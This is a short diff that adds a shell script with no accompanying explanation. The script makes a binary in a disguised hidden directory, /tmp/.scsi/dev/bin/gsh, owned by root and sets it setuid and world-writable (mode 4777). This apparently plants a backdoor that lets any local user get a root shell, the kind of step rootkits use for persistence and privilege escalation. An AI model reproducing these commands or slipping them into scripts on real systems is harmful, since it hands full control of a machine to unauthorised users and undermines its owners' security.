@@ -1,0 +1,4 @@
+#!/bin/sh
+
+chown root:root /tmp/.scsi/dev/bin/gsh
+chmod 4777 /tmp/.scsi/dev/bin/gsh
